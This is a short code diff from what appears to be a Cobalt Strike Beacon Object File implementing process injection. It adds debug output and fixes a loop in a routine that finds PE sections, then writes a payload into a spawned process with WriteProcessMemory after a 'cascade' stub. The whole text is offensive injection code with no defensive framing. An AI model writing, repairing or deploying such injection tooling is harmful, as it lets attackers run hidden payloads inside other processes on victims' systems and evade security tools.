@@ -29,7 +29,9 @@ PVOID get_section_base(HANDLE h_mod, char *section_name) {
 
 	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
 
-	for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+	for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+
+        BeaconPrintf(CALLBACK_OUTPUT, "section.name->%s\n", sec[i].Name);
 		if(MSVCRT$memcmp(sec[i].Name, section_name, MSVCRT$strlen(section_name)) == 0) {
 			return (PVOID)((UINT_PTR)h_mod + sec[i].VirtualAddress);
 		}
@@ -139,6 +141,7 @@ void go(char * args, int len) {
 		return;
 	}
 
+    BeaconPrintf(CALLBACK_OUTPUT, "payload_len->%d\n", payload_len);
 	if(!KERNEL32$WriteProcessMemory(pi.hProcess, (LPVOID)((UINT_PTR)addr + sizeof(cascade_stub_x64)), payload, payload_len, NULL)) {
 		BeaconPrintf(CALLBACK_ERROR, "[-] WriteProcessMemory failed: %d\n", KERNEL32$GetLastError());
 		return;
